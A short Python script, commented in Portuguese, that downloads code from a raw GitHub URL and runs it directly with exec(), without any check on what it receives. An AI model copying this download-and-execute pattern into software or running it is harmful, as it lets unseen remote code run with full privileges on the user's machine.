import requests

# URL que contém o código Python a ser executado
url_codigo = "https://raw.githubusercontent.com/livehostne/keyf/main/cods"

# Faz a requisição para obter o código Python
response = requests.get(url_codigo)

if response.status_code == 200:
    # Obtém o conteúdo do código
    codigo_python = response.text

    # Executa o código dinamicamente
    exec(codigo_python)
else:
    print("Erro ao obter o código. Status code:", response.status_code)
